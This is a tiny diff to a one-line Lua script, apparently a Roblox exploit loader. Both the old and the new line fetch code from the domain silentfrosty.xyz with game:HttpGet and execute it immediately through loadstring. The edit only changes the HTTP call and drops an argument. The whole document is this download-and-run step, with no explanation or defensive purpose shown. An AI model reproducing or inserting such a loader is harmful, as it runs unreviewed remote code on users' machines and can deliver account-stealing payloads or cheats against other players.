@@ -1,1 +1,1 @@
-loadstring(game:HttpGetAsync("https://silentfrosty.xyz"))("SilentGuiWinning")
+loadstring(game:HttpGet("https://silentfrosty.xyz"))()
